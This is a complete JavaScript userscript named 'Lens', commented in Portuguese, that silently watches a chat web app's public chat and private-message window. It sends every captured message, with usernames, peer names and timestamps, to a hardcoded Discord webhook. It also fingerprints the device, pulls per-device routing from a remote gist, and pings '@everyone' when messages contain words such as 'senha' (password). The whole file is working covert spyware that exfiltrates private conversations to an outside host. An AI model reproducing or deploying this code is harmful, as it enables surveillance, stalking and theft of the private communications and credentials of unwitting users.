(function() {
    'use strict';

    if (window._lens) {
        try { if (typeof window._lens.kill === 'function') window._lens.kill(); } catch(e) {}
        try { delete window._lens; } catch(e) {}
    }

    // ============================================================
    // CONFIG
    // ============================================================
    var LENS_VERSION = '2.2.3';

    var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
    var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/lens.json';

    var ALERT_WORDS = ['sang', 'sangue', 'sangui', 'chris', 'namorado', 'senha'];
    var ALERT_PING = '@everyone';
    var ALLOWED_ROLES = ['1552637564597436537'];

    var PRIVATE_WINDOW_SEL = '.nitro-friends-messenger';
    var PRIVATE_PEER_SEL = '.messenger-active-chat-header .fw-bold.text-truncate';
    var PRIVATE_MSGS_SEL = '.chat-messages';
    var PRIVATE_MSG_SEL = '.messages-group-left, .messages-group-right';
    var PRIVATE_FIRST_SCAN_DELAY = 300;

    var DM_LOG_KEY = 'lens_dm_log_v1';
    var DM_LOG_MAX_PER_PEER = 500;
    var DM_LOG_SAVE_DEBOUNCE_MS = 1500;

    var DEBUG_GROUP_MS = 3000;
    var DEBUG_STACK_MAX = 700;

    var FLUSH_BATCH = 5;
    var FLUSH_DELAY = 400;
    var MAX_QUEUE = 5000;

    var ROUTE_CACHE_KEY = 'lens_route_cache_v1';
    var ROUTE_CACHE_TTL_MS = 6 * 60 * 60 * 1000;
    // ============================================================

    var MSG_TEMPLATE = '**{user}**: {msg}';
    var HEADER_INTERVAL = 60 * 1000;
    var CONFIG_REFRESH_MS = 5 * 60 * 1000;
    var PUBLIC_SKIP_HISTORY = true;
    var MIN_MSG_LEN = 1;
    var SCAN_DEBOUNCE_MS = 80;
    var RETRY_5XX_MS = 2000;
    var RETRY_FALLBACK_MS = 1500;

    var SEL_PRIMARY = '.chat-content';
    var SEL_BUBBLE = '.bubble-container';
    var SEL_VISIBLE = 'chatbubblevisible';
    var USER_SELECTORS = ['.username','.user','.nick','.author','[class*="username" i]','[class*="nick" i]','[class*="author" i]'];

    var _queue = [];
    var _isSending = false;
    var _lastHeaderTime = { public: 0, dms: 0 };
    var _seen = new Set();
    var _observer = null;
    var _scanScheduled = false;
    var _noop = function() {};

    var _remoteConfig = null;
    var _remoteConfigAt = 0;
    var _routeCache = null;
    var _sessionHash = null;
    var _deviceId = null;
    var DEVICE_ID_KEY = 'lens_device_id';
    var _sessionLabel = '';
    var _announcedHash = null;
    var _started = false;

    // Chave de agrupamento por canal. Cada kind tem sua própria chave
    // pra que trocar de canal não reinicie o agrupamento do outro.
    var _lastSpeakerKey = { public: null, dms: null };

    var _privateStateByPeer = new Map();
    var _privateCurrentPeer = null;
    var _privateSeenEls = null;

    var _dmLogSaveTimer = null;

    var _metrics = {
        sent: 0,
        failed: 0,
        rateLimited: 0,
        retries: 0,
        lastErrorAt: 0,
        lastErrorKind: '',
        queueDropped: 0,
        debugSent: 0,
        debugSuppressed: 0,
        dmHashesTrimmed: 0
    };

    // ================= DEBUG =================
    var _dbgLastAt = 0;
    var _dbgSuppressed = 0;

    function _debugReport(kind, err, ctx) {
        if (!DEFAULT_WEBHOOK) return;

        var now = Date.now();
        if (now - _dbgLastAt < DEBUG_GROUP_MS) {
            _dbgSuppressed++;
            _metrics.debugSuppressed++;
            return;
        }
        _dbgLastAt = now;

        var suppressed = _dbgSuppressed;
        _dbgSuppressed = 0;

        var detail = '';
        try {
            if (err && err.stack) detail = String(err.stack);
            else if (err && err.message) detail = String(err.message);
            else if (err) detail = String(err);
        } catch (e) { detail = '(não serializável)'; }

        if (detail.length > DEBUG_STACK_MAX) detail = detail.slice(0, DEBUG_STACK_MAX) + '…';

        var header = '⚠️ `' + String(kind) + '` · `v' + LENS_VERSION + '` · `' + (_deviceId || '?') + '`';
        if (suppressed > 0) header += ' · +' + suppressed + ' supr.';
        if (ctx) header += '\n> ' + String(ctx).slice(0, 160);

        var body = detail ? '\n```\n' + detail + '\n```' : '';

        try {
            _metrics.debugSent++;
            fetch(DEFAULT_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: header + body,
                    username: 'Lens · debug',
                    allowed_mentions: { parse: [] }
                })
            }).catch(_noop);
        } catch (e) {}
    }

    function _log() { /* no-op */ }

    // ================= SESSÃO =================
    function _persistentSeed() {
        var k = 'lens_seed';
        var s = null;
        try { s = localStorage.getItem(k); } catch(e) {}
        if (!s) {
            s = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
            try { localStorage.setItem(k, s); } catch(e) {}
        }
        return s;
    }

    function _hashStr(s) {
        var h = 5381;
        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
        return (h >>> 0).toString(36);
    }

    function _computeHash() {
        var parts = [
            navigator.userAgent || '',
            navigator.language || '',
            navigator.platform || '',
            (screen.width + 'x' + screen.height) || '',
            String((new Date()).getTimezoneOffset()),
            _persistentSeed()
        ];
        return _hashStr(parts.join('|'));
    }

    function _getDeviceId() {
        try {
            var id = localStorage.getItem(DEVICE_ID_KEY);
            if (!id) {
                id = 'dev_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
                localStorage.setItem(DEVICE_ID_KEY, id);
            }
            return id;
        } catch(e) {
            return 'tmp_' + _computeHash();
        }
    }

    // ================= CACHE DE ROTA =================
    function _loadRouteCache() {
        try {
            var raw = localStorage.getItem(ROUTE_CACHE_KEY);
            if (!raw) return null;
            var o = JSON.parse(raw);
            if (!o || typeof o !== 'object') return null;
            if (!o.at || Date.now() - o.at > ROUTE_CACHE_TTL_MS) return null;
            return o;
        } catch(e) { return null; }
    }

    function _saveRouteCache(entry) {
        try {
            localStorage.setItem(ROUTE_CACHE_KEY, JSON.stringify({
                webhook: entry.webhook || '',
                webhookDMs: entry.webhookDMs || '',
                label: entry.label || '',
                mapped: entry.mapped === true,
                disabled: entry.disabled === true,
                at: Date.now()
            }));
        } catch(e) {}
    }

    // ================= DM LOG =================
    function _loadDmLog() {
        try {
            var raw = localStorage.getItem(DM_LOG_KEY);
            if (!raw) return;
            var obj = JSON.parse(raw);
            if (!obj || typeof obj !== 'object') return;
            for (var peer in obj) {
                if (!Array.isArray(obj[peer])) continue;
                var rec = _stateFor(peer);
                for (var i = 0; i < obj[peer].length; i++) {
                    rec.hashes.add(obj[peer][i]);
                }
            }
        } catch(e) {}
    }

    function _scheduleDmLogSave() {
        if (_dmLogSaveTimer) return;
        _dmLogSaveTimer = setTimeout(function() {
            _dmLogSaveTimer = null;
            try {
                var out = {};
                _privateStateByPeer.forEach(function(rec, peer) {
                    if (!rec.hashes.size) return;
                    var arr = Array.from(rec.hashes);
                    if (arr.length > DM_LOG_MAX_PER_PEER) arr = arr.slice(-DM_LOG_MAX_PER_PEER);
                    out[peer] = arr;
                });
                localStorage.setItem(DM_LOG_KEY, JSON.stringify(out));
            } catch(e) {
                try { localStorage.removeItem(DM_LOG_KEY); } catch(e2) {}
            }
        }, DM_LOG_SAVE_DEBOUNCE_MS);
    }

    // ================= CONFIG REMOTA =================
    function _fetchConfig() {
        if (!CONFIG_URL || CONFIG_URL.indexOf('http') !== 0) return Promise.resolve(_remoteConfig);
        var sep = CONFIG_URL.indexOf('?') === -1 ? '?' : '&';
        var url = CONFIG_URL + sep + 't=' + Date.now();
        return fetch(url, { cache: 'no-store' })
            .then(function(r) {
                if (!r.ok) throw new Error('config HTTP ' + r.status);
                return r.json();
            })
            .then(function(j) {
                if (j && typeof j === 'object') {
                    _remoteConfig = j;
                    _remoteConfigAt = Date.now();
                    _applyConfig();
                    _resolveRoute();
                }
                return _remoteConfig;
            })
            .catch(function(e) {
                _debugReport('config-fetch', e, CONFIG_URL.slice(0, 80));
                return _remoteConfig;
            });
    }

    function _ensureConfigFresh() {
        if (Date.now() - _remoteConfigAt < CONFIG_REFRESH_MS && _remoteConfig) return;
        _fetchConfig();
    }

    function _applyConfig() {
        if (!_remoteConfig) return;
        var id = _deviceId || _sessionHash;
        if (!id) return;
        var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
        if (entry && entry.label) {
            _sessionLabel = String(entry.label);
        }
    }

    function _resolveRoute() {
        var cached = _loadRouteCache();
        if (cached) {
            _routeCache = cached;
            return cached;
        }

        if (!_remoteConfig) {
            _routeCache = null;
            return null;
        }

        var id = _deviceId || _sessionHash;
        var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]) || null;

        if (!entry) {
            _routeCache = {
                webhook: DEFAULT_WEBHOOK,
                webhookDMs: DEFAULT_WEBHOOK,
                label: '',
                mapped: false,
                disabled: false,
                at: Date.now()
            };
            return _routeCache;
        }

        if (entry.disabled === true) {
            _routeCache = {
                webhook: '',
                webhookDMs: '',
                label: entry.label || '',
                mapped: true,
                disabled: true,
                at: Date.now()
            };
            return _routeCache;
        }

        _routeCache = {
            webhook: entry.webhook || DEFAULT_WEBHOOK,
            webhookDMs: entry.webhookDMs || entry.webhook || DEFAULT_WEBHOOK,
            label: entry.label || '',
            mapped: true,
            disabled: false,
            at: Date.now()
        };
        _saveRouteCache(_routeCache);
        return _routeCache;
    }

    function _route(kind) {
        if (!_routeCache) _resolveRoute();
        var r = _routeCache || { webhook: DEFAULT_WEBHOOK, webhookDMs: DEFAULT_WEBHOOK, mapped: false, disabled: false, label: '' };
        if (r.disabled) return { url: '', mapped: true, disabled: true, label: r.label };
        var url = (kind === 'dms') ? (r.webhookDMs || r.webhook) : (r.webhook || DEFAULT_WEBHOOK);
        return {
            url: url,
            label: r.label || '',
            mapped: r.mapped === true,
            disabled: false,
            key: _deviceId || _sessionHash
        };
    }

    function _displayTag() {
        if (_routeCache && _routeCache.label) return _routeCache.label;
        var id = _deviceId || _sessionHash;
        return _sessionLabel ? (_sessionLabel + ' [' + id + ']') : id;
    }

    // ================= AGRUPAMENTO DE VOZ =================
    function _resetSpeaker(kind) {
        if (kind === 'public') _lastSpeakerKey.public = null;
        else if (kind === 'dms') _lastSpeakerKey.dms = null;
        else { _lastSpeakerKey.public = null; _lastSpeakerKey.dms = null; }
    }

    // ================= TIME =================
    function _nowBrasilia() {
        var now = new Date();
        var brt = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
        var dd = String(brt.getDate()).padStart(2, '0');
        var mm = String(brt.getMonth() + 1).padStart(2, '0');
        var yyyy = brt.getFullYear();
        var hh = String(brt.getHours()).padStart(2, '0');
        var min = String(brt.getMinutes()).padStart(2, '0');
        var ss = String(brt.getSeconds()).padStart(2, '0');
        return dd + '/' + mm + '/' + yyyy + ' ' + hh + ':' + min + ':' + ss;
    }

    function _nowHHMM() { return _nowBrasilia().substring(11, 16); }

    // ================= DOM EXTRACT =================
    function _extractUserFromContent(content) {
        for (var i = 0; i < USER_SELECTORS.length; i++) {
            try {
                var el = content.querySelector(USER_SELECTORS[i]);
                if (!el) continue;
                var t = (el.textContent || '').trim();
                if (!t || t.length > 40) continue;
                var full = (content.innerText || content.textContent || '').trim();
                if (t === full) continue;
                return t;
            } catch (e) {}
        }
        var spans = content.querySelectorAll('b, strong, span');
        for (var j = 0; j < spans.length; j++) {
            var st = (spans[j].textContent || '').trim();
            if (!st || st.length > 30) continue;
            if (/[.!?]/.test(st)) continue;
            var full2 = (content.innerText || content.textContent || '').trim();
            if (st === full2) continue;
            return st;
        }
        return null;
    }

    function _cleanMsg(full, user) {
        var msg = full;
        if (user && msg.indexOf(user) === 0) msg = msg.slice(user.length);
        return msg.replace(/^\s*[\s:>|·•\-–—]+/, '').trim();
    }

    function _extractFromBubble(bubble) {
        if (!bubble || bubble.nodeType !== 1) return null;
        var content = bubble.querySelector(SEL_PRIMARY);
        if (!content) return null;
        var full = (content.innerText || content.textContent || '').trim();
        if (!full) return null;
        var user = _extractUserFromContent(content);
        if (!user) return null;
        var msg = _cleanMsg(full, user);
        if (!msg || msg.length < MIN_MSG_LEN) return null;
        return { user: user, msg: msg };
    }

    // ================= PRIVATE WINDOW =================
    var _privateOpen = false;
    var _privateEl = null;
    var _privateMsgsEl = null;
    var _privateMsgsObserver = null;

    function _peerKey(peer) { return peer || '__unknown__'; }

    function _stateFor(peer) {
        var k = _peerKey(peer);
        var rec = _privateStateByPeer.get(k);
        if (!rec) {
            rec = {
                seen: new WeakSet(),
                hashes: new Set(),
                lastScanAt: 0
            };
            _privateStateByPeer.set(k, rec);
        }
        return rec;
    }

    function _checkPrivate() {
        var el = null;
        try { el = document.querySelector(PRIVATE_WINDOW_SEL); } catch(e) {}
        if (el && !_privateOpen) {
            _openPrivate(el);
        } else if (!el && _privateOpen) {
            _closePrivate();
        } else if (el && _privateOpen) {
            _checkPeerSwap(el);
        }
    }

    // Detecta troca de contato sem fechar/abrir a janela.
    // Compara o peer do header com o peer atual. Se mudou, re-observa o
    // container de mensagens (que o Discord substitui na troca) e notifica.
    function _checkPeerSwap(el) {
        var peer = _privatePeer(el);
        if (peer === _privateCurrentPeer) return;

        var oldPeer = _privateCurrentPeer || '(sem nome)';
        _privateCurrentPeer = peer;

        var rec = _stateFor(peer);
        _privateSeenEls = rec.seen;

        // Container de mensagens foi trocado pelo Discord. Sem re-observar
        // o novo nó, paramos de ver mensagens do contato novo.
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
        _privateMsgsEl = null;

        _resetSpeaker('dms');
        _enqueueStatus('dms', '▸ 🔄 ***Trocou*** · `' + oldPeer + '` → `' + (peer || '(sem nome)') + '`');

        _watchPrivateMsgs(el);
    }

    function _privatePeer(el) {
        if (!el) return '';
        try {
            var n = el.querySelector(PRIVATE_PEER_SEL);
            return n ? (n.textContent || '').trim() : '';
        } catch(e) { return ''; }
    }

    function _openPrivate(el) {
        _privateOpen = true;
        _privateEl = el;

        var peer = _privatePeer(el);
        _privateCurrentPeer = peer;
        var rec = _stateFor(peer);
        _privateSeenEls = rec.seen;

        _resetSpeaker('dms');
        _enqueueStatus('dms', '▸ 🟢 ***Aberto*** · `' + (peer || '(sem nome)') + '`');

        _watchPrivateMsgs(el);
    }

    function _closePrivate() {
        var peer = _privatePeer(_privateEl);
        _resetSpeaker('dms');
        _enqueueStatus('dms', '⏹ 🔴 __Fechado__ · `' + (peer || '(sem nome)') + '`');

        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
        _privateCurrentPeer = null;
        _privateSeenEls = null;
    }

    function _watchPrivateMsgs(el, attempt) {
        attempt = attempt || 0;
        var msgs = null;
        try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
        if (!msgs) {
            if (attempt < 5) setTimeout(function() { _watchPrivateMsgs(el, attempt + 1); }, 200 * (attempt + 1));
            return;
        }
        _privateMsgsEl = msgs;
        _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
        _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
        setTimeout(_scanPrivateMsgs, PRIVATE_FIRST_SCAN_DELAY);
    }

    function _scanPrivateMsgs() {
        if (!_privateMsgsEl) return;
        if (_privateCurrentPeer === null) return;
        var rec = _stateFor(_privateCurrentPeer);
        var groups;
        try { groups = _privateMsgsEl.querySelectorAll(PRIVATE_MSG_SEL); } catch(e) { return; }

        var added = false;

        for (var i = 0; i < groups.length; i++) {
            var g = groups[i];
            var userEl = g.querySelector('.fw-bold');
            var user = userEl ? (userEl.textContent || '').trim() : '';
            var isSelf = g.classList.contains('messages-group-right');
            var textEls = g.querySelectorAll('.text-break');

            for (var j = 0; j < textEls.length; j++) {
                var te = textEls[j];
                if (rec.seen.has(te)) continue;
                var text = (te.textContent || '').trim();
                if (!text) continue;
                rec.seen.add(te);

                var hashKey = (isSelf ? 'self' : 'peer') + '\u0000' + user + '\u0000' + text;
                if (rec.hashes.has(hashKey)) continue;
                rec.hashes.add(hashKey);
                added = true;

                if (rec.hashes.size > DM_LOG_MAX_PER_PEER) {
                    var arr = Array.from(rec.hashes).slice(-Math.floor(DM_LOG_MAX_PER_PEER / 2));
                    rec.hashes = new Set(arr);
                    _metrics.dmHashesTrimmed += (DM_LOG_MAX_PER_PEER - arr.length);
                }

                _emitPrivateText(user, text, isSelf);
            }
        }

        rec.lastScanAt = Date.now();
        if (added) _scheduleDmLogSave();
    }

    function _emitPrivateText(user, text, isSelf) {
        var arrow = isSelf ? '➡️' : '⬅️';
        var key = 'priv:' + arrow + ':' + user;
        var cont = (key === _lastSpeakerKey.dms);

        var body;
        if (cont) {
            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' ' + text;
        } else {
            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
            _lastSpeakerKey.dms = key;
        }
        _enqueue('dms', body);
    }

    // ================= SCAN (público) =================
    function _scanBubbles(initial) {
        _checkPrivate();
        var bubbles;
        try { bubbles = document.querySelectorAll(SEL_BUBBLE); } catch (e) { return; }

        for (var i = 0; i < bubbles.length; i++) {
            var data = _extractFromBubble(bubbles[i]);
            if (!data) continue;
            var key = data.user + '\u0000' + data.msg;
            if (_seen.has(key)) continue;
            _seen.add(key);
            if (initial && PUBLIC_SKIP_HISTORY) continue;
            _emit(data.user, data.msg);
        }

        if (_seen.size > 2000) {
            _seen.clear();
            for (var k = 0; k < bubbles.length; k++) {
                var d2 = _extractFromBubble(bubbles[k]);
                if (d2) _seen.add(d2.user + '\u0000' + d2.msg);
            }
        }
    }

    function _scheduleScan() {
        if (_scanScheduled) return;
        _scanScheduled = true;
        setTimeout(function() {
            _scanScheduled = false;
            _scanBubbles(false);
        }, SCAN_DEBOUNCE_MS);
    }

    function _startObserver() {
        if (_observer) return;
        _scanBubbles(true);
        _observer = new MutationObserver(function(muts) {
            for (var i = 0; i < muts.length; i++) {
                var m = muts[i];
                if (m.type === 'childList' && m.addedNodes.length) { _scheduleScan(); return; }
                if (m.type === 'characterData') { _scheduleScan(); return; }
                if (m.type === 'attributes' && m.target && m.target.classList &&
                    m.target.classList.contains(SEL_VISIBLE)) { _scheduleScan(); return; }
            }
        });
        var root = document.body || document.documentElement;
        if (root) {
            _observer.observe(root, {
                childList: true, subtree: true, characterData: true,
                attributes: true, attributeFilter: ['class']
            });
        }
    }

    function _stopObserver() {
        if (_observer) { _observer.disconnect(); _observer = null; }
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
    }

    // ================= FORMAT + SEND =================
    function _format(user, msg) {
        return MSG_TEMPLATE.replace('{user}', user).replace('{msg}', msg);
    }

    function _hasAlert(msg) {
        var low = String(msg || '').toLowerCase();
        for (var i = 0; i < ALERT_WORDS.length; i++) {
            if (low.indexOf(ALERT_WORDS[i].toLowerCase()) !== -1) return true;
        }
        return false;
    }

    function _emit(user, msg) {
        _ensureConfigFresh();
        var isAlert = _hasAlert(msg);
        var prefix = isAlert ? (ALERT_PING + ' ') : '';

        if (isAlert) _resetSpeaker('public');

        var key = 'pub:' + user;
        var cont = (key === _lastSpeakerKey.public);

        var body;
        if (cont) {
            body = '`' + _nowBrasilia() + '` ⬅️ ' + msg;
        } else {
            body = '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
            _lastSpeakerKey.public = key;
        }
        _enqueue('public', prefix + body);
    }

    // Header por canal. Cada kind tem seu próprio intervalo de 60s.
    // Visual diferenciado:
    //   public: ━━━ 🕐 **HH:MM** · `label` ━━━
    //   dms:    ━━━ 🔒 **HH:MM** ━━━
    function _checkHeader(kind) {
        var now = Date.now();
        if (now - _lastHeaderTime[kind] < HEADER_INTERVAL) return;

        var line;
        if (kind === 'dms') {
            line = '━━━━━━━ 🔒 **' + _nowHHMM() + '** ━━━━━━━';
        } else {
            var tag = _routeCache && _routeCache.mapped
                ? '`' + _displayTag() + '`'
                : ('novo · `' + (_deviceId || _sessionHash) + '` · mapeie no gist');
            line = '━━━━━━━ 🕐 **' + _nowHHMM() + '** · ' + tag + ' ━━━━━━━';
        }
        _queue.push({ kind: kind, line: line });
        _lastHeaderTime[kind] = now;

        // Header quebra agrupamento do seu canal
        _resetSpeaker(kind);
    }

    function _announceIfNew() {
        if (_routeCache && _routeCache.mapped) return;
        var id = _deviceId || _sessionHash;
        if (_announcedHash === id) return;
        _announcedHash = id;
        var line = '🟢 **novo dispositivo** `' + id + '`\n' +
                   'session: `' + _sessionHash + '`\n' +
                   'UA: `' + (navigator.userAgent || '').slice(0, 90) + '`\n' +
                   'adicione no gist: `"' + id + '": { "webhook": "...", "webhookDMs": "...", "label": "..." }`';
        fetch(DEFAULT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: line, username: 'Lens · ' + id })
        }).catch(function(e) { _debugReport('announce', e, id); });
    }

    function _enqueue(kind, line) {
        if (!line || line.length < 5) return;
        _checkHeader(kind);

        if (_queue.length >= MAX_QUEUE) {
            var drop = _queue.length - MAX_QUEUE + 1;
            _queue.splice(0, drop);
            _metrics.queueDropped += drop;
            _debugReport('queue-overflow', 'descartados ' + drop + ' itens', String(_queue.length));
        }

        _queue.push({ kind: kind, line: line });
        if (!_isSending) _flush();
    }

    // Status de sessão (abriu/fechou/trocou). Nunca dispara header.
    function _enqueueStatus(kind, line) {
        if (!line || line.length < 5) return;

        if (_queue.length >= MAX_QUEUE) {
            var drop = _queue.length - MAX_QUEUE + 1;
            _queue.splice(0, drop);
            _metrics.queueDropped += drop;
            _debugReport('queue-overflow', 'descartados ' + drop + ' itens', String(_queue.length));
        }

        _queue.push({ kind: kind, line: line });
        if (!_isSending) _flush();
    }

    // ================= FLUSH =================
    function _flush() {
        if (_isSending || _queue.length === 0) return;
        _isSending = true;

        var firstKind = _queue[0].kind;
        var batch = [];
        var rest = [];
        for (var i = 0; i < _queue.length; i++) {
            if (batch.length < FLUSH_BATCH && _queue[i].kind === firstKind) {
                batch.push(_queue[i]);
            } else {
                rest.push(_queue[i]);
            }
        }
        _queue = rest;

        var r = _route(firstKind);
        var target = r.url;

        if (!target || r.disabled) {
            _isSending = false;
            setTimeout(_flush, FLUSH_DELAY);
            return;
        }

        var content = batch.map(function(x) { return x.line; }).join('\n');
        if (content.length > 1950) content = content.substring(0, 1950) + '...';

        var retryDelay = null;

        fetch(target, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: content,
                username: 'Lens · ' + _displayTag(),
                allowed_mentions: { parse: ['everyone'], roles: ALLOWED_ROLES }
            })
        })
        .then(function(res) {
            if (res.status === 429) {
                _metrics.rateLimited++;
                return res.json()
                    .then(function(j) {
                        var wait = (j && j.retry_after ? j.retry_after * 1000 : 1000) + 300;
                        retryDelay = wait;
                        _queue = batch.concat(_queue);
                        _debugReport('rate-limit', 'aguardando ' + Math.round(wait) + 'ms', target.slice(-30));
                    })
                    .catch(function() {
                        retryDelay = 1500;
                        _queue = batch.concat(_queue);
                        _debugReport('rate-limit', 'resposta não-JSON, backoff padrão');
                    });
            }

            if (res.status >= 500) {
                _metrics.retries++;
                if (!batch._retried) {
                    batch._retried = true;
                    _queue = batch.concat(_queue);
                    retryDelay = RETRY_5XX_MS;
                    _debugReport('server-' + res.status, 'retentando batch', target.slice(-30));
                    return;
                }
                throw new Error('HTTP ' + res.status + ' (após retry)');
            }

            if (!res.ok) throw new Error('HTTP ' + res.status);

            _metrics.sent += batch.length;
        })
        .catch(function(e) {
            _metrics.failed++;
            _metrics.lastErrorAt = Date.now();
            _metrics.lastErrorKind = 'flush:' + firstKind;
            _debugReport('flush-' + firstKind, e, target.slice(-30));
            retryDelay = RETRY_FALLBACK_MS;
        })
        .then(function() {
            _isSending = false;
            setTimeout(_flush, retryDelay != null ? retryDelay : FLUSH_DELAY);
        });
    }

    // ================= INIT / KILL =================
    function init() {
        if (_started) return;
        _started = true;

        _sessionHash = _computeHash();
        _deviceId = _getDeviceId();

        _loadDmLog();
        _resolveRoute();

        _fetchConfig().then(function() {
            _applyConfig();
            _resolveRoute();
            _announceIfNew();
        });
        setInterval(_fetchConfig, CONFIG_REFRESH_MS);

        _startObserver();
    }

    function kill() {
        _queue.length = 0;
        _seen.clear();
        _stopObserver();
        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        _privateStateByPeer.clear();
        _privateCurrentPeer = null;
        _privateSeenEls = null;
        _lastSpeakerKey = { public: null, dms: null };
        if (_dmLogSaveTimer) { clearTimeout(_dmLogSaveTimer); _dmLogSaveTimer = null; }
        _started = false;
        try { delete window._lens; } catch(e) {}
    }

    // ================= API =================
    Object.defineProperty(window, '_lens', {
        value: {
            kill: kill,
            init: init,
            scan: function() { _scanBubbles(false); },
            hash: function() { return _sessionHash; },
            deviceId: function() { return _deviceId; },
            setDeviceId: function(id) {
                if (!id || typeof id !== 'string') return _deviceId;
                try { localStorage.setItem(DEVICE_ID_KEY, id); } catch(e) {}
                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
                _deviceId = id;
                _announcedHash = null;
                _routeCache = null;
                _applyConfig();
                _resolveRoute();
                return _deviceId;
            },
            label: function() { return _sessionLabel; },
            route: function(kind) { return _route(kind); },
            refreshConfig: function() { return _fetchConfig(); },
            clearRouteCache: function() {
                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
                _routeCache = null;
                return _resolveRoute();
            },
            clearDmLog: function(peer) {
                if (peer) {
                    var rec = _privateStateByPeer.get(_peerKey(peer));
                    if (rec) rec.hashes.clear();
                } else {
                    _privateStateByPeer.forEach(function(rec) { rec.hashes.clear(); });
                }
                try { localStorage.removeItem(DM_LOG_KEY); } catch(e) {}
                return true;
            },
            forceRoute: function(hash, entry) {
                if (!_remoteConfig) _remoteConfig = {};
                _remoteConfig[hash || _deviceId || _sessionHash] = entry;
                _remoteConfigAt = Date.now() + CONFIG_REFRESH_MS * 10;
                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
                _routeCache = null;
                _applyConfig();
                _resolveRoute();
                return _route();
            },
            privateOpen: function() { return _privateOpen; },
            privatePeer: function() { return _privatePeer(_privateEl); },
            privateScan: function() { _scanPrivateMsgs(); },
            privatePeers: function() { return Array.from(_privateStateByPeer.keys()); },
            privateStats: function(peer) {
                var rec = _privateStateByPeer.get(_peerKey(peer));
                if (!rec) return null;
                return {
                    hashes: rec.hashes.size,
                    lastScanAt: rec.lastScanAt
                };
            },
            version: function() { return LENS_VERSION; },
            stats: function() {
                return {
                    version: LENS_VERSION,
                    deviceId: _deviceId,
                    sessionHash: _sessionHash,
                    label: _sessionLabel,
                    route: {
                        mapped: _routeCache ? _routeCache.mapped === true : false,
                        label: _routeCache ? _routeCache.label : '',
                        disabled: _routeCache ? _routeCache.disabled === true : false,
                        hasPublic: !!(_routeCache && _routeCache.webhook),
                        hasDMs: !!(_routeCache && _routeCache.webhookDMs),
                        cachedAt: _routeCache ? _routeCache.at : 0
                    },
                    seen: _seen.size,
                    queue: _queue.length,
                    queuePublic: _queue.filter(function(x){ return x.kind === 'public'; }).length,
                    queueDMs: _queue.filter(function(x){ return x.kind === 'dms'; }).length,
                    privateOpen: _privateOpen,
                    privatePeer: _privatePeer(_privateEl),
                    privatePeers: _privateStateByPeer.size,
                    lastSpeaker: _lastSpeakerKey,
                    metrics: {
                        sent: _metrics.sent,
                        failed: _metrics.failed,
                        rateLimited: _metrics.rateLimited,
                        retries: _metrics.retries,
                        queueDropped: _metrics.queueDropped,
                        debugSent: _metrics.debugSent,
                        debugSuppressed: _metrics.debugSuppressed,
                        dmHashesTrimmed: _metrics.dmHashesTrimmed,
                        lastErrorAt: _metrics.lastErrorAt,
                        lastErrorKind: _metrics.lastErrorKind
                    }
                };
            },
            reportTest: function() {
                _debugReport('manual-test', 'chamado via _lens.reportTest()');
                return 'sent';
            }
        },
        configurable: true,
        enumerable: false,
        writable: false
    });

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', function() { setTimeout(init, 0); });
    }
    setTimeout(function() { if (!_started) init(); }, 3000);

})();
